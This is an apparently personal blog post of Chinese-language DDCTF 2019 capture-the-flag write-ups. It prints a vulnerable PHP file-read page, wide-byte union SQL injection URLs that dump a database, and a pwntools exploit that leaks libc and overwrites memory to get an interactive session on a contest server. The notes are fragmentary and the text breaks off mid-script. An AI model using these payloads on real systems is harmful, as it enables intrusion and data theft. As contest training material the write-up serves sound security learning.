<!DOCTYPE html>
<html lang=en>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="web1 滴看到url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 解一下这个base64得到 flag.jpg 显然是任意文件读取 尝试读index.php &amp;lt;?">
<meta name="keywords" content="1nv0k3r, blog, pwn, binary, exploit, vuln">
<meta property="og:type" content="article">
<meta property="og:title" content="DDCTF 2019 WP">
<meta property="og:url" content="http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/index.html">
<meta property="og:site_name" content="1nv0k3r&#39;s blog">
<meta property="og:description" content="web1 滴看到url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 解一下这个base64得到 flag.jpg 显然是任意文件读取 尝试读index.php &amp;lt;?">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-04-22T08:16:47.597Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="DDCTF 2019 WP">
<meta name="twitter:description" content="web1 滴看到url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 解一下这个base64得到 flag.jpg 显然是任意文件读取 尝试读index.php &amp;lt;?">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>DDCTF 2019 WP</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/05/01/ISCC-2019-WP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/23/TCTF-2019-Qualifier/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&text=DDCTF 2019 WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&is_video=false&description=DDCTF 2019 WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DDCTF 2019 WP&body=Check out this article: http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&title=DDCTF 2019 WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/04/12/DDCTF-2019-WP/&name=DDCTF 2019 WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-滴"><span class="toc-number">1.</span> <span class="toc-text">web1 滴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-WEB签到题"><span class="toc-number">2.</span> <span class="toc-text">web2 WEB签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re2"><span class="toc-number"></span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#for-k-in-l"><span class="toc-number"></span> <span class="toc-text">for k in l:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#p-process-‘-xpwn’"><span class="toc-number"></span> <span class="toc-text">p = process(‘./xpwn’)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-libc-symbols-‘-IO-setbuffer’"><span class="toc-number"></span> <span class="toc-text">print hex(libc.symbols[‘_IO_setbuffer’])</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-hex-u32-addr"><span class="toc-number"></span> <span class="toc-text">print(hex(u32(addr)))</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-attach-p"><span class="toc-number"></span> <span class="toc-text">gdb.attach(p)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload-p32-libc-addr-0x5f065-0x10-1-’-x00’"><span class="toc-number"></span> <span class="toc-text">payload = p32(libc_addr+0x5f065)*(0x10+1)+’\x00’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding-utf-8"><span class="toc-number"></span> <span class="toc-text">-- coding: utf-8 --</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Date-2019-04-15-22-18-34"><span class="toc-number"></span> <span class="toc-text">@Date    : 2019-04-15 22:18:34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Author-mote"><span class="toc-number"></span> <span class="toc-text">@Author  : mote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#register-url-‘http-117-51-147-155-5050-ctf-api-register-name-aabc-amp-password-aabcaabc-39"><span class="toc-number"></span> <span class="toc-text">register_url = ‘http://117.51.147.155:5050/ctf/api/register?name=aabc&amp;password=aabcaabc&#39;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-SCHEMA-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,SCHEMA_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-SCHEMATA-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.SCHEMATA %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-1"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-TABLE-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,TABLE_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-TABLES-where-TABLE-SCHEMA-0x6374666462-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.TABLES where TABLE_SCHEMA=0x6374666462 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-2"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-COLUMN-NAME-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,COLUMN_NAME,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-information-schema-COLUMNS-where-TABLE-NAME-0x6374665F66686D4852504C35-23’"><span class="toc-number"></span> <span class="toc-text">‘from information_schema.COLUMNS where TABLE_NAME=0x6374665F66686D4852504C35 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url-‘http-117-51-147-2-Ze02pQYLf5gGNyMn-query-aIeMu0FUoVrW0NWPHbN6z4xh-php-39-3"><span class="toc-number"></span> <span class="toc-text">url = ‘http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?&#39; \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘id-df-27-20union-select-1-2-3-ctf-value-5-‘"><span class="toc-number"></span> <span class="toc-text">‘id=%df%27%20union select 1,2,3,ctf_value,5 ‘ \</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#‘from-ctfdb-ctf-fhmHRPL5-23’"><span class="toc-number"></span> <span class="toc-text">‘from ctfdb.ctf_fhmHRPL5 %23’</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#print-requests-get-url-text"><span class="toc-number"></span> <span class="toc-text">print(requests.get(url).text)</span></a>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        DDCTF 2019 WP
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">1nv0k3r's blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-04-12T08:41:31.000Z" itemprop="datePublished">2019-04-12</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="web1-滴"><a href="#web1-滴" class="headerlink" title="web1 滴"></a>web1 滴</h2><p>看到url：<a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a></p>
<p>解一下这个base64得到 flag.jpg</p>
<p>显然是任意文件读取</p>
<p>尝试读index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看起来似乎要绕过str_replace读config.php</p>
<p>最后从注释的CSDN找到另一篇文章：<a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a></p>
<p>文章里提到文件名<code>.practice.txt.swp</code></p>
<p>最后要读的文件是<code>practice.txt.swp</code> ？？？？？？？？？？？？？？？？？？？？？？</p>
<p>出题人有毛病吧</p>
<p>读到flag，加上DDCTF{}：DDCTF{f1ag!ddctf.p}</p>
<h2 id="web2-WEB签到题"><a href="#web2-WEB签到题" class="headerlink" title="web2 WEB签到题"></a>web2 WEB签到题</h2><p><a href="http://117.51.158.44/index.php">http://117.51.158.44/index.php</a></p>
<p>打开说没有权限，让登录</p>
<p>网页源码找到一个js</p>
<p><a href="http://117.51.158.44/js/index.js">http://117.51.158.44/js/index.js</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提示在header加didictf_username，尝试设置这个值为admin</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>本次比赛唯一一个pwn</p>
<p>$ddctf = new Session();<br>$ddctf-&gt;index();<br>auth();-&gt;check HTTP_DIDICTF_USERNAME = admin : didictf_username=admin<br>get_key();-&gt;$this-&gt;eancrykey =  file_get_contents(‘../config/key.txt’);<br>session_read();<br>false-&gt;session_create();<br>$sessionid = random</p>
<pre><code>$userdata = array(
    &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)), uniqid(前缀, 熵(随机的))
    &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],
    &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],
    &apos;user_data&apos; =&gt; &apos;&apos;,
);
</code></pre><p>$cookiedata = serialize($userdata); 序列化<br>$cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); cookiedata序列化+md5后的eancrykey和cookiedata<br>$expire = $this-&gt;cookie_expiration + time(); 7200+time</p>
<pre><code>setcookie(
    $this-&gt;cookie_name,     名称
    $cookiedata,            值
    $expire,                有效期
    $this-&gt;cookie_path,     服务器路径
    $this-&gt;cookie_domain,   域名
    $this-&gt;cookie_secure    https
    );
</code></pre><p>$session = $_COOKIE[$this-&gt;cookie_name]; = ddctf_id<br>$hash = substr($session,strlen($session)-32); 最后32位<br>$session = substr($session,0,strlen($session)-32);</p>
<h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1><p>input[7]<br>result[7]<br>v7 = (unsigned int)v3 &gt;&gt; 1;   # 0 1<br>v3 += 2;                      # 2 4<br><em>(&amp;v10 + v7) = v4 | 16 </em> v9;  # res[0]=in[1]|16*in[0]</p>
<p>49 = ?|16*? </p>
<p>0   2   res[0]=in[1]|16<em>in[0]   0xad<br>1   4   res[1]=in[3]|16</em>in[2]   0xeb<br>2   6   res[2]=in[5]|16<em>in[4]   0xde<br>3   8   res[3]=in[7]|16</em>in[6]   0xae</p>
<p>4   10  res[4]=in[9]|16<em>in[8]   0xc7<br>5   12  res[5]=in[11]|16</em>in[10] 0xbe</p>
<p>DDCTF{ADEBDEAEC7BE}<br>0xad 0xeb 0xde 0xae 0xc7 0xbe</p>
<p>l = {0xad, 0xeb, 0xde, 0xae, 0xc7, 0xbe}</p>
<p>flag = ‘DDCTF{‘</p>
<h1 id="for-k-in-l"><a href="#for-k-in-l" class="headerlink" title="for k in l:"></a>for k in l:</h1><p>for i in range(0, 255):<br>    for j in range(0, 255):<br>        temp = i | j * 16<br>        if temp == 0xad:<br>            if 15 &gt;= i &gt;= 0 and 15 &gt;= j &gt;= 0:<br>                print(‘found:’ + str(i) + ‘ ‘ + str(j) + ‘ ‘ + str(hex(temp)))<br>                if 9 &gt;= j &gt;= 0:<br>                    flag += chr(j + ord(‘0’))<br>                elif 15 &gt;= j &gt;= 10:<br>                    flag += chr(j + 55)<br>                if 9 &gt;= i &gt;= 0:<br>                    flag += chr(i + ord(‘0’))<br>                elif 15 &gt;= i &gt;= 10:<br>                    flag += chr(i + 55)</p>
<p>print(flag + ‘}’)</p>
<p>(‘60’, 38), (‘63’, 40), (‘7e’, 41), (‘79’, 44), (‘77’, 49), (‘65’, 50), </p>
<p>from pwn import <em><br>context.log_level = ‘debug’<br>p = process(‘./xpwn’)<br>p.recv()<br>p.sendline(‘a’)<br>p.recv()<br>p.sendline(‘-1’)<br>p.recv()<br>p.sendline(‘A’ </em> 0x4c)<br>from pwn import *</p>
<p>context.log_level = ‘debug’</p>
<h1 id="p-process-‘-xpwn’"><a href="#p-process-‘-xpwn’" class="headerlink" title="p = process(‘./xpwn’)"></a>p = process(‘./xpwn’)</h1><p>p = remote(‘116.85.48.105’,5005)<br>libc = ELF(‘./libc.so.6’)</p>
<p>p.sendafter(‘Enter username:’,’AAAA’<em>0x6)<br>p.recvuntil(‘A’</em>24)</p>
<h1 id="print-hex-libc-symbols-‘-IO-setbuffer’"><a href="#print-hex-libc-symbols-‘-IO-setbuffer’" class="headerlink" title="print hex(libc.symbols[‘_IO_setbuffer’])"></a>print hex(libc.symbols[‘_IO_setbuffer’])</h1><h1 id="print-hex-u32-addr"><a href="#print-hex-u32-addr" class="headerlink" title="print(hex(u32(addr)))"></a>print(hex(u32(addr)))</h1><p>libc_addr = u32(p.recv(4))-0x5f6bb<br>log.success(“libc_addr=”+hex(libc_addr))</p>
<h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.sendlineafter(‘Please set the length of password:’,str(-5))</p>
<h1 id="payload-p32-libc-addr-0x5f065-0x10-1-’-x00’"><a href="#payload-p32-libc-addr-0x5f065-0x10-1-’-x00’" class="headerlink" title="payload = p32(libc_addr+0x5f065)*(0x10+1)+’\x00’"></a>payload = p32(libc_addr+0x5f065)*(0x10+1)+’\x00’</h1><p>payload = p32(libc_addr+0x5f065)*17+’\x00’<br>print len(payload)<br>p.sendafter(‘):’,payload)<br>p.recv()<br>p.interactive()</p>
<p>付款-&gt;查订单信息-&gt;查余额信息<br>删订单-&gt;查订单-&gt;查余额<br>买票-&gt;<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* @class ViewController */</span></span><br><span class="line">-(<span class="keyword">void</span>)checkCode:(<span class="keyword">void</span> *)arg2 &#123;</span><br><span class="line">    var_28 = self;</span><br><span class="line">    var_30 = _cmd;</span><br><span class="line">    var_38 = <span class="number">0x0</span>;</span><br><span class="line">    rax = objc_storeStrong(&amp;var_38, arg2);</span><br><span class="line">    var_40 = <span class="number">0x0</span>;</span><br><span class="line">    rax = [var_28 pwd];</span><br><span class="line">    rax = [rax retain];</span><br><span class="line">    var_48 = [[rax stringValue] retain];</span><br><span class="line">    rax = [rax release];</span><br><span class="line">    rsi = @selector(hasPrefix:);</span><br><span class="line">    rdx = @<span class="string">"DDCTF&#123;"</span>;</span><br><span class="line">    <span class="keyword">if</span> (LOBYTE((*_objc_msgSend)(var_48, rsi)) != <span class="number">0x0</span>) &#123;</span><br><span class="line">            rsi = @selector(hasPrefix:);</span><br><span class="line">            rdx = @<span class="string">"DDCTF&#123;"</span>;</span><br><span class="line">            var_50 = [[var_48 substringFromIndex:[var_48 length] - <span class="number">0x1</span>] retain];</span><br><span class="line">            <span class="keyword">if</span> (LOBYTE([var_50 isEqualToString:@<span class="string">"&#125;"</span>]) != <span class="number">0x0</span>) &#123;</span><br><span class="line">                    rsi = @selector(isEqualToString:);</span><br><span class="line">                    rcx = @<span class="string">"&#125;"</span>;</span><br><span class="line">                    rcx = *_objc_msgSend;</span><br><span class="line">                    rcx = [var_48 length] - <span class="number">0x7</span>;</span><br><span class="line">                    var_58 = [[var_48 substringWithRange:<span class="number">0x6</span>] retain];</span><br><span class="line">                    <span class="keyword">if</span> ([var_58 length] == <span class="number">0x12</span>) &#123;</span><br><span class="line">                            rsi = @selector(length);</span><br><span class="line">                            rdx = <span class="number">0x6</span>;</span><br><span class="line">                            var_40 = [objc_retainAutorelease(var_58) UTF8String];</span><br><span class="line">                    &#125;</span><br><span class="line">                    rdx = <span class="number">0x6</span>;</span><br><span class="line">                    rax = objc_storeStrong(&amp;var_58, LODWORD(<span class="number">0x0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            LODWORD(rsi) = LODWORD(<span class="number">0x0</span>);</span><br><span class="line">            rax = objc_storeStrong(&amp;var_50, rsi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (var_40 == <span class="number">0x0</span>) &#123;</span><br><span class="line">            rax = [var_28 onFailed];</span><br><span class="line">            var_6C = <span class="number">0x1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LODWORD(sub_1000011d0(var_40, rsi)) == <span class="number">0x1</span>) &#123;</span><br><span class="line">                    rax = [var_28 onSuccess];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                    rax = [var_28 onFailed];</span><br><span class="line">            &#125;</span><br><span class="line">            var_6C = <span class="number">0x1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rax = objc_storeStrong(&amp;var_48, LODWORD(<span class="number">0x0</span>));</span><br><span class="line">    rax = objc_storeStrong(&amp;var_38, LODWORD(<span class="number">0x0</span>));</span><br><span class="line">    rbp = <span class="built_in">stack</span>[<span class="number">-8</span>];</span><br><span class="line">    rsp = rsp + <span class="number">0x98</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.6</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="keyword">import</span> librosa <span class="comment"># v0.6.2, maybe ffmpeg is needed as backend</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># v1.15.4</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># Pillow v5.4.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version[<span class="number">0</span>] == <span class="string">'3'</span>:</span><br><span class="line">    xrange = range</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_range_wrapper</span><span class="params">(*args)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> list(xrange(*args))</span><br><span class="line">    range = _range_wrapper</span><br><span class="line"></span><br><span class="line">window_size = <span class="number">2048</span></span><br><span class="line">step_size = <span class="number">100</span></span><br><span class="line">max_lim = <span class="number">0.15</span></span><br><span class="line">f_ubound = <span class="number">2000</span></span><br><span class="line">f_bins = <span class="number">150</span></span><br><span class="line">sr = <span class="number">15000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_x</span><span class="params">(x, f_ubound=f_ubound, f_bins=f_bins)</span>:</span></span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    seqs = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> freqs:</span><br><span class="line">        seq = []</span><br><span class="line">        d = cmath.exp(<span class="number">-2j</span> * cmath.pi * f / sr)</span><br><span class="line">        coeff = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(len(x)):</span><br><span class="line">            seq.append(x[t] * coeff)</span><br><span class="line">            coeff *= d</span><br><span class="line">        seqs.append(seq)</span><br><span class="line">    sums = []</span><br><span class="line">    <span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">        X = [sum(seq[:window_size])/window_size]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> xrange(step_size, len(x), step_size):</span><br><span class="line">            X.append(X[<span class="number">-1</span>]-sum(seq[t-step_size:t])/window_size)</span><br><span class="line">            <span class="keyword">if</span> t+window_size-step_size &lt; len(x): X[<span class="number">-1</span>] += sum(seq[t+window_size-step_size:t+window_size])/window_size</span><br><span class="line">        sums.append(X)</span><br><span class="line">    <span class="keyword">return</span> freqs, np.array(sums)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_sqr_diff</span><span class="params">(x, spec)</span>:</span></span><br><span class="line">    f, x = transform_x(x)</span><br><span class="line">    <span class="keyword">if</span> x.shape != spec.shape: <span class="keyword">return</span> <span class="number">999</span></span><br><span class="line">    <span class="keyword">return</span> np.average((np.abs(x)-np.abs(spec))**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_map</span><span class="params">(v, old_dbound, 